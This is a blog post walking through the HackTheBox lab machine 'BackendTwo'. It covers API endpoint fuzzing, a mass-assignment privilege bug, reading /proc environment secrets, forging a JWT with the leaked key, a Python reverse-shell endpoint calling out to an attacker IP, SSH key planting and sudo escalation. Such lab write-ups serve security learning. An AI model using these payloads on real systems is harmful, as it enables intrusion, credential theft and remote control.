---
layout: post
name: backendtwo
title: "HackTheBox: BackendTwo"
date: 2022-05-24 08:00:00 +1000
categories: red-team
tags: linux feroxbuster api-hacking proc reverse-shell password-reuse
summary: /proc/and/roll!
excerpt_separator: <!--more-->
---

**BackendTwo** is a Linux-based machine authored by *ippsec*, with an average rating of 5.0 stars.

<!--more-->

<p align="center"><img src="/assets/images/backendtwo/main.png" /></p>

### // Lessons Learned
1. Effective content discovery against APIs requires consideration of different wordlists, the impact of varying the HTTP verb (GET, POST etc.) and sometimes forced recursion (that is, recursing on a found endpoint even when the usual indications of further nested content are not present) 
2. Manual enumeration FTW

### // Recon
```
┌──(kali㉿kali)-[~/HTB/backendtwo]
└─$ nmap -A -p- backendtwo.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-09 09:38 AEST
Nmap scan report for backendtwo.htb (10.10.11.162)
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Mon, 09 May 2022 00:08:34 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Mon, 09 May 2022 00:08:22 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC Api v2.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Mon, 09 May 2022 00:08:28 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : ...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1737.60 seconds
```

Nmap reveals this target to be likely running Ubuntu, with a minimal set of reachable services:
- ssh on port `22`
- a `uvicorn` webserver on port `80`

[Uvicorn](https://www.uvicorn.org/) is a lightweight, python-based ASGI (asynchronous server gateway interace) webserver. Some basic Googling doesn't reveal much in terms of obvious vulnerabilities, though versions of the software prior to `0.11.7` are known to be vulnerable to [response splitting](https://security.snyk.io/vuln/SNYK-PYTHON-UVICORN-570471), a technique that involves manipulating HTTP request values with `CRLF` characters that the sofware fails to correctly handle. This may prove useful later on, but right now doesn't offer much of a way in.

Issuing a standard `GET /` request elicits the following response, indicating a JSON-based API is available:
```
HTTP/1.1 200 OK
date: Sun, 08 May 2022 23:44:06 GMT
server: uvicorn
content-length: 22
content-type: application/json
Connection: close

{"msg":"UHC Api v2.0"}
```

Most APIs provide any documentation at one of several well-known endpoints, and in this case that seems to be `http://backendtwo.htb/docs`. Unfortunately in this case, that only gets us a `401` response:
```
{"detail":"Not authenticated"}
```

Fuzzing an API in search of endpoints is similar to crawling a website looking for urls, with a few important differences. Obviously we need to use appropriate wordlists that follow the conventions of the API (e.g. RESTful design), as well as consider how those endpoints will respond to different HTTP verbs (for example, running `GET` against a `/user` endpoint is usually associated with retrieving a user(s), while running `POST` will usually route to the code that handles user creation). Recursion is also an important strategy to consider, since important endpoints may exist in unusual locations. A tool that excels in handling these nuances is [Feroxbuster](https://github.com/epi052/feroxbuster). Running it against the target with the default `raft-medium-directories.txt` wordlist from [Seclists](https://github.com/danielmiessler/SecLists) quickly yields results:
```
$ feroxbuster -u http://backendtwo.htb -w ~/github/danielmiessler/SecLists/Discovery/Web-Content/raft-medium-directories.txt --force-recursion

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://backendtwo.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ ~/github/danielmiessler/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🤘  Force Recursion       │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        3w       22c http://backendtwo.htb/
401      GET        1l        2w       30c http://backendtwo.htb/docs
200      GET        1l        1w       19c http://backendtwo.htb/api
200      GET        1l        1w       32c http://backendtwo.htb/api/v1
307      GET        0l        0w        0c http://backendtwo.htb/api/v1/admin => http://backendtwo.htb/api/v1/admin/
[####################] - 6m    180000/180000  0s      found:5       errors:10228
[####################] - 6m     30000/30000   77/s    http://backendtwo.htb
[####################] - 6m     30000/30000   77/s    http://backendtwo.htb/
[####################] - 6m     30000/30000   77/s    http://backendtwo.htb/docs
[####################] - 6m     30000/30000   77/s    http://backendtwo.htb/api
[####################] - 6m     30000/30000   77/s    http://backendtwo.htb/api/v1
[####################] - 6m     30000/30000   77/s    http://backendtwo.htb/api/v1/admin
```

`http://backendtwo.htb/api` looks to provide a list of api versions:
```
{
  "endpoints": "/v1"
}
```

and `/api/v1` gives us two specific endpoints, only one of which was identified by feroxbuster:
```
{
  "endpoints": [
    "/user",
    "/admin"
  ]
}
```

Accessing `/api/v1/user` returns `{"detail":"Not Found"}`, indicating we probably need to supply a user id. `/api/v1/user/x` (where x is a valid user id) returns basic user info, e.g `/api/v1/user/1` appears to be a site admin:
```
{
  "guid": "25d386cd-b808-4107-8d3a-4277a0443a6e",
  "email": "admin@backendtwo.htb",
  "profile": "UHC Admin",
  "last_update": null,
  "time_created": 1650987800991,
  "is_superuser": true,
  "id": 1
}
```

while `/api/v1/admin` returns another `401 Unauthorized`:
```
{
  "detail": "Not authenticated"
}
```

### // Initial Foothold

Since the `/api/v1/user` endpoint wasn't picked up by feroxbuster, it's worth re-running it against that specific path. The parameter settings look a little different here in order to cut down the noise:
```
$ feroxbuster -u http://backendtwo.htb/api/v1/user -m POST --dont-filter -C 405

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://backendtwo.htb/api/v1/user
 🚀  Threads               │ 50
 📖  Wordlist              │ ~/github/danielmiessler/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [POST]
 🤪  Filter Wildcards      │ false
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404     POST        1l        2w       22c http://backendtwo.htb/api/v1/user
422     POST        1l        3w      172c http://backendtwo.htb/api/v1/user/login
422     POST        1l        2w       81c http://backendtwo.htb/api/v1/user/signup
[####################] - 1m     30000/30000   0s      found:3       errors:350
[####################] - 1m     30000/30000   387/s   http://backendtwo.htb/api/v1/user
```

Essentially we're running the same wordlist, but only with the `POST` verb (`-m POST`). We're also ignoring `405` responses (`-C 405`). The `--dont-filter` flag was applied after an initial run indicated a number of responses were being filtered automatically as "wildcard responses".

We've now discovered two important endpoints we can POST data to, `/login` and `/signup`. The response from `/login` indicates we need to supply a `username` and `password` value to proceed:
```
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```

For now we'll focus on the `/signup` endpoint. Based on the response types seen so far, it's safe to assume that this endpoint expects to receive JSON data. It takes a few attempts to build a valid payload, but based on the error messages received we eventually end up with a pretty simple request (written in python here, but could be any language / HTTP agent):
```
import requests

payload = {'email': 'soma@backendtwo.htb', 'password': 'soma'}
r = requests.post("http://backendtwo.htb/api/v1/user/signup", json=payload, proxies={'http': '127.0.0.1:8080'})

print(r.status_code)
print(r.text)
```

`HTTP 201` indicates a [resource has been created](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/201), which we can confirm by requesting the first user id that was previously returning null:
```
curl http://backendtwo.htb/api/v1/user/12
{
  "guid": "31d67843-1ce7-4ae2-ae1d-84f932281696",
  "email": "soma@backendtwo.htb",
  "profile": null,
  "last_update": null,
  "time_created": 1653006003306,
  "is_superuser": false,
  "id": 12
}
```

We now have access to a regular account. Trying to send a payload that included `"is_superuser": "true"` unfortunately had no effect, but still, some access is better than none! Attempting to login with this account using the same kind of POST / JSON request returns an unexpected error:
```
payload = {'email': 'soma@backendtwo.htb', 'password': 'soma', 'is_superuser': 'true'}
r = requests.post("http://backendtwo.htb/api/v1/user/signup", json=payload, proxies={'http': '127.0.0.1:8080'})

{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
```

Again it takes some experimentation, but eventually it's revealed that the `/login` endpoint expects the content to be supplied as `application/x-www-form-urlencoded` data, rather than `application/json`:
```
payload = {'username': 'soma@backendtwo.htb', 'password': 'soma'}
r = requests.post("http://backendtwo.htb/api/v1/user/login", data=payload, proxies={'http': '127.0.0.1:8080'})

{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUzNjk3OTU4LCJpYXQiOjE2NTMwMDY3NTgsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjMxZDY3ODQzLTFjZTctNGFlMi1hZTFkLTg0ZjkzMjI4MTY5NiJ9.vHHQoMhOClpeKF8_SzQMrww06kdTly5SIV6vB2ehGLI","token_type":"bearer"}
```

The bearer token returned looks to be a [JSON Web Token](https://jwt.io/), carrying the following encoded payload:
```
{
  "type": "access_token",
  "exp": 1653697958,
  "iat": 1653006758,
  "sub": "12",
  "is_superuser": false,
  "guid": "31d67843-1ce7-4ae2-ae1d-84f932281696"
}
```

Testing this token out against the `/api/v1/admin/` endpoint returns a predictable error (`{"results":false}`) but including it in the request headers to `/docs` identified earlier is more successful:

![](/assets/images/backendtwo/1.png)

This presents us with a complete list of the API's endpoints, as well as web-based forms we can used to test them out. The `admin` section immediately stands out as interesting, with four endpoints available:
1. `GET /api/v1/admin` (already discovered by feroxbuster)
2. `GET /api/v1/admin/get_user_flag` Get User Flag
3. `GET /api/v1/admin/file/{file_name}` Get File
4. `POST /api/v1/admin/file/{file_name}` Write File

### // User Flag

Attempting to grab the first flag through `/api/v1/admin/get_user_flag` via the UI or native request returns the usual unauthorized error, even when including our bearer token (which makes sense, since the payload of that token includes `"is_superuser": false`). Looking at the `user` section we can see there is a `PUT /api/v1/user/{user_id}/edit Edit Profile` endpoint. After using the `Authorize` form at the top of the page to generate a token for this session, we're indeed able to edit the `profile` field of our account:
```
# Request
PUT /api/v1/user/12/edit HTTP/1.1
Host: backendtwo.htb
Content-Length: 23
accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUzNjk3OTU4LCJpYXQiOjE2NTMwMDY3NTgsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjMxZDY3ODQzLTFjZTctNGFlMi1hZTFkLTg0ZjkzMjI4MTY5NiJ9.vHHQoMhOClpeKF8_SzQMrww06kdTly5SIV6vB2ehGLI
Content-Type: application/json
Origin: http://backendtwo.htb
Referer: http://backendtwo.htb/docs
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{
  "profile": "Soma"
}

# Response
HTTP/1.1 200 OK
date: Fri, 20 May 2022 00:55:30 GMT
server: uvicorn
content-length: 17
content-type: application/json
Connection: close

{"result":"true"}
```

Perhaps this ability to edit our account extends to other, more interesting properties?
```
# Request
PUT /api/v1/user/12/edit HTTP/1.1
Host: backendtwo.htb
Content-Length: 47
accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUzNjk3OTU4LCJpYXQiOjE2NTMwMDY3NTgsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjMxZDY3ODQzLTFjZTctNGFlMi1hZTFkLTg0ZjkzMjI4MTY5NiJ9.vHHQoMhOClpeKF8_SzQMrww06kdTly5SIV6vB2ehGLI
Content-Type: application/json
Origin: http://backendtwo.htb
Referer: http://backendtwo.htb/docs
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{
  "is_superuser": true
}

# Response
HTTP/1.1 200 OK
date: Fri, 20 May 2022 00:56:30 GMT
server: uvicorn
content-length: 17
content-type: application/json
Connection: close

{"result":"true"}
```

Requesting our account again from `/api/v1/user/12` confirms this has worked:
```
{
  "guid": "31d67843-1ce7-4ae2-ae1d-84f932281696",
  "email": "soma@backendtwo.htb",
  "profile": "Soma",
  "last_update": null,
  "time_created": 1653006003306,
  "is_superuser": true,
  "id": 12
}
```

This is a classic API authorization oversight (or 'mass assignment') bug - while we were unable to set `is_superuser` when creating our account, we were permitted to modify it when editing our account, meaning the API fails to properly distinguish betweeen fields we should and shouldn't be able to edit. Any new tokens we generate via `/api/v1/user/login` now include the field indicating we have privileged access:
```
{
  "type": "access_token",
  "exp": 1653699581,
  "iat": 1653008381,
  "sub": "12",
  "is_superuser": true,
  "guid": "31d67843-1ce7-4ae2-ae1d-84f932281696"
}
```

We can confirm this by accessing the `/api/v1/admin/` endpoint:
```
{"results":true}
```

as well as access the user flag at the previously unavailable endpoint `/api/v1/admin/get_user_flag`:
```
{"file":"3bd16***************************\n"}
```

### // Privilege Escalation
Looking at the other admin features that are now available to us, there are two file-related endpoints:
1. `GET /api/v1/admin/file/{file_name} Get File`
2. `POST /api/v1/admin/file/{file_name} Write File`

`Get File` expects the `{file_name}` parameter to be a base64-encoded file path. It works straight away with our admin token, and we can use it to read any file on the system that we have permission for and know the location of, e.g. `/api/v1/admin/file/L2V0Yy9wYXNzd2Q=` to request the contents of `/etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
...
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
```

To increase our access to the machine, the `htb` account is an obvious choice, since it's the only non-root account that is capable of logging in.

We also have access to the `Write file` endpoint, which provides a way to write to a file, again with the `{file_name}` paramter base64-encoded. However any attempt to use this function (e.g `/api/v1/admin/file/L3RtcC90ZXN0` which would write a file to `/tmp/test`, a location that should be writable by any user) returns the following error:
```
{
  "detail": "Debug key missing from JWT"
}
```

Obviously our JWT is missing some particular field, e.g. `"debug": true`. We can try to manually insert it into the payload, but this causes the token to fail validation, as the signature portion is no longer valid. JWTs [offer a number of methods for signing](https://auth0.com/blog/rs256-vs-hs256-whats-the-difference/), in our case the header portion confirms `HS256` is in use:
```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

`HS256` stands for `HMAC with SHA-256` (and `HMAC` itself stands for `hash-based message authentication code`). Essentially it is a *symmetric hashing algorithm*, meaning the same secret key is used to both sign and validate the signature. This is easier to setup - but generally considered less secure - than the popular alternative `RS256` (`RSA Signature with SHA-256`), which is an *asymmetric hashing algorithm* that uses public/private keys. The key signing & validation process is designed to prevent tampering with the payload, as we're trying to do. There are at least two well-known techniques to bypass this validation:

1. Certain implementations of JWT have been found to [accept tokens with signing disabled](https://insomniasec.com/blog/auth0-jwt-validation-bypass), by specifying `"alg": none` (or if necessary a mixed case value, such as `"alg": nonE`) in the header. In this situation, the server doesn't perform any validation, believing the token's claim that there is no algorithm in use.
2. If `RS256` is in use, and the public key can be retrieved by an attacker, the server can sometimes be fooled into using that public key (rather than the private key) to validate the signature, by manually changing the algorithm from `RS256` to `HS256`.

Technique 2 is unlikely to be usable here, since the server has already indicated that it's using `HS256` (symmetric) validation. Similarly, it seems the server can't be fooled into believing that validation is not enabled through any kind of `"alg": none` value. If we want to be able to modify the payload, we'll need to somehow recover the `HS256` key in use on the target. The `Get File` endpoint could be very helpful in retrieving this, but we have no real idea of where the key may be stored on the filesystem, if at all. There are some conventional endpoints that can indicate where this type of file might exist, such as `/.well_known/jwks.json`. But on this target, nothing like this can be found.

One location that we can predictably read on the filesystem, however, is `/proc`, the [process-information / virtual filesystem](https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html). This provides access to runtime system information, which can include things like environment variables, where secrets and sensitive values are often stored. Like a real filesystem, `/proc` is managed in a hierarchical manner, meaning that to access the environment for a specific process, we'd want to look at `/proc/<pid>/environ` (where `<pid>` represents the id of the process we're interested in). To get an idea of what processes are running on the system, we can in turn look to `/proc/sched_debug`, which essentially provides a list of running processes (similar to the output of the `ps` command) and which processor is managing them (a longer list of `/proc` paths that can be exploited for useful information can be found [here](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/)). The `Get File` endpoint can be used to request this, and amongst the extensive output can be seen the following:
```
GET /api/v1/admin/file/L3Byb2Mvc2NoZWRfZGVidWc=

Sched Debug Version: v0.11, 5.4.0-77-generic #86-Ubuntu
ktime                                   : 6849023.651325
sched_clk                               : 6849084.742887
cpu_clk                                 : 6849059.608324
jiffies                                 : 4296604501
sched_clock_stable()                    : 1
...
 S        uvicorn   908   1360723.218120    187166   120         0.000000   2801840.053227         0.000000 0 0 /autogroup-77
 S        python3   913       362.339407         7   120         0.000000        62.437272         0.000000 0 0 /autogroup-77
...
```

This output reveals that the `uvicorn` process (previously identified as the webserver in use) has pid `908`. There is also a `python3` process at pid `913`, which is the process that uvicorn handed off to on startup, and where we'll likely find any useful information. Using the `Get File` endpoint to retrieve `/proc/913/environ` confirms this:
```
GET /api/v1/admin/file/L3Byb2MvOTEzL2Vudmlyb24=

{
USER=htb
HOME=/home/htb
OLDPWD=/
PORT=80
LOGNAME=htb
JOURNAL_STREAM=9:22217
APP_MODULE=app.main:app
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=b9cea78235d242a99cf213dc562f5fa6
LANG=C.UTF-8
API_KEY=68b329da9893e34099c7d8ad5cb9c940
HOST=0.0.0.0
PWD=/home/htb
}
```

Given the webserver-like context of several of the variables here (`PORT`, `APP_MODULE`, `HOST` etc.) `API_KEY=68b329da9893e34099c7d8ad5cb9c940` is strongly likely to be what we're after. We can take this value to the online JWT tool [jwt.io](https://jwt.io), modify our payload to include the debug key and sign it with the stolen key. Now when we attempt to use the `Write File` endpoint to write to `/tmp/test`, we get a more interesting response:
```
POST /api/v1/admin/file/L3RtcC90ZXN0

{
  "result": "success"
}
```

With write access to the server established, the next step is to convert this into something more useful, such as a remote shell to enable proper remote code execution. Looking again at the environment variable data previously dumped from `/proc`, we can get an idea of where we might be able to target for this:
```
APP_MODULE=app.main:app
```

Uvicorn uses `APP_MODULE` to describe the python module (in this case `app.main`, which considering the value of the `PWD` environment variable should be found in a file in `/home/htb/app/main.py`) and variable / function to execute (in this case `app`). We can again use the `Get File` endpoint to retrieve this file:
```
GET /api/v1/admin/file/L2hvbWUvaHRiL2FwcC9tYWluLnB5

{
  "file": "import asyncio\nimport os\n\nwith open('pid','w') as f:\n    f.write( str(os.getpid())  )\n\nfrom fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends\nfrom fastapi_contrib.common.responses import UJSONResponse\nfrom fastapi import FastAPI, Depends, HTTPException, status\nfrom fastapi.security import HTTPBasic, HTTPBasicCredentials\nfrom fastapi.openapi.docs import get_swagger_ui_html\nfrom fastapi.openapi.utils import get_openapi\n\n\n\nfrom typing import Optional, Any\nfrom pathlib import Path\nfrom sqlalchemy.orm import Session\n\n\n\nfrom app.schemas.user import User\nfrom app.api.v1.api import api_router\nfrom app.core.config import settings\n\nfrom app.api import deps\nfrom app import crud\n\n\n\napp = FastAPI(title=\"UHC API Quals\", openapi_url=None, docs_url=None, redoc_url=None)\nroot_router = APIRouter(default_response_class=UJSONResponse)\n\n\n\n@app.get(\"/\", status_code=200)\ndef root():\n    \"\"\"\n    Root GET\n    \"\"\"\n    return {\"msg\": \"UHC Api v2.0\"}\n\n\n@app.get(\"/api\", status_code=200)\ndef root():\n    \"\"\"\n    /api endpoints\n    \"\"\"\n    return {\"endpoints\":\"/v1\"}\n\n\n@app.get(\"/api/v1\", status_code=200)\ndef root():\n    \"\"\"\n    /api/v1 endpoints\n    \"\"\"\n    return {\"endpoints\":[\"/user\",\"/admin\"]}\n\n\n\n@app.get(\"/docs\")\nasync def get_documentation(\n    current_user: User = Depends(deps.parse_token)\n    ):\n    return get_swagger_ui_html(openapi_url=\"/openapi.json\", title=\"docs\")\n\n@app.get(\"/openapi.json\")\nasync def openapi(\n    current_user: User = Depends(deps.parse_token)\n):\n    return get_openapi(title = \"FastAPI\", version=\"0.1.0\", routes=app.routes)\n\napp.include_router(api_router, prefix=settings.API_V1_STR)\napp.include_router(root_router)\n\n\ndef start():\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=80, log_level=\"debug\")\n\nif __name__ == \"__main__\":\n    # Use this for debugging purposes only\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=80, log_level=\"debug\")\n"
}
```

Once formatted correctly, we can see how each endpoint of the api is defined:
```
@app.get(\"/\", status_code=200)
def root():
    \"\"\"
    Root GET
    \"\"\"
    return {\"msg\": \"UHC Api v2.0\"}
```

To establish a reverse shell to our attack box, all we have to do is define a new endpoint, in this case `/shell`, that makes use of a [well-known technique for establishing a reverse shell in python](https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell):
```
import socket, subprocess, os

@app.get(\"/shell\", status_code=200)
def root():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.230\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);
    \"\"\"
    /api endpoints
    \"\"\"
    return {\"endpoints\":\"/shell\"}
```

We then simply have to write this file back to the server and establish a reverse shell listener:
```
┌──(kali㉿kali)-[/mnt/…/VMWare-shared/github/brightio/penelope]
└─$ python penelope.py 443
[+] Listening for reverse shells on 0.0.0.0 🚪443 
```

As soon as we call `http://backendtwo.htb/shell`, we'll catch a shell:
```
GET /shell

[+] Got reverse shell from 🐧 backendtwo.htb~10.10.11.162 💀 - Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/backendtwo.htb~10.10.11.162/backendtwo.htb~10.10.11.162.log 📜
```

There's a lot of noise / unwanted outpout in this shell, since the web connection still hasn't been terminated. A better option at this point is to establish passwordless ssh access to the `htb` account, which can be done with a simple one-liner:
```
mkdir .ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDosrQhocCXDyHCWnwyz2rTX46g6wocjC6lg+niNvohsHigqD6wtEAWdPkmR9Ek+B...2hBYIaV6pA0fn9gGyw9KTbQifZqvEVh5PQps= kali@kali' >> .ssh/authorized_keys && chmod 600 .ssh/authorized_keys
```

We can now easily ssh into the box as `htb`:
```
┌──(kali㉿kali)-[~/HTB/backendtwo]
└─$ ssh htb@backendtwo.htb -i ~/.ssh/id_rsa   
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
See "man sudo_root" for details.

htb@BackendTwo:~$
```

### // Privilege Escalation

Increasingly I'm finding that the best way to achieve privilege escalation is via manual enumeration of a target (checking for custom software, sensitive data leaked into logs, credentials in code etc.) before turning to automated tools such as [LinPEAS](https://github.com/carlospolop/PEASS-ng). In this case, there is a `/home/htb/app` folder that contains the resources necessary to run the api (python source code, libraries, a sqlite database etc.) We can dump the `users` table from the database, but it looks like the passwords are bcrypt-encrypted, making cracking via a tool like hashcat unfeasible. The file responsible for user login, `api/v1/endpoints/user.py`, references an `auth.log` file, which resides in `/home/htb`:
```
htb@BackendTwo:~$ cat auth.log
05/22/2022, 20:35:13 - Login Success for admin@htb.local
05/22/2022, 20:38:33 - Login Success for admin@htb.local
05/22/2022, 20:51:53 - Login Success for admin@htb.local
05/22/2022, 21:33:33 - Login Success for admin@htb.local
05/22/2022, 21:41:53 - Login Failure for 1qaz2wsx_htb!
05/22/2022, 21:43:28 - Login Success for admin@htb.local
05/22/2022, 21:43:33 - Login Success for admin@htb.local
05/22/2022, 21:45:13 - Login Success for admin@htb.local
05/22/2022, 21:50:13 - Login Success for admin@htb.local
05/22/2022, 21:56:53 - Login Success for admin@htb.local
...
```

Line 5 looks to be a classic case of a user mis-entering their password in the username field. If we try to `sudo` with this password, we're presented with another challenge:
```
htb@BackendTwo:~$ sudo su -
[sudo] password for htb: <enter 1qaz2wsx_htb! here>
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.
```

[PAM-Wordle](https://github.com/cocoa-xu/pam_wordle?ref=cpp.codetea.com) is basically an implementation of a word guessing game, similar to Wordle (or Hangman for those old enough to remember). While it is possible to guess the correct word with no background context, some further system enumeration reveals there is a wordlist at `/opt/.words` from which the secret word will always be chosen. Using the feedback from each guess, and some regular expression magic against this wordlist (e.g. if letters a, b and c are reported to be incorrect, these can be excluded via a 'negative-lookaround' pattern such as `^((?![abc]).)*$)`) it's possible to identify the correct word, and the leaked password is found to be valid:
```
--- Attempt 1 of 6 ---
Word: utime
Hint->*????
--- Attempt 2 of 6 ---
Word: vfork
Hint->?f???
--- Attempt 3 of 6 ---
Word: wfuzz
Correct!
root@BackendTwo:~#
```

From here, we can grab the root flag in the usual location:
```
root@BackendTwo:~# cat /root/root.txt
35703***************************
```

![](/assets/images/backendtwo/2.png)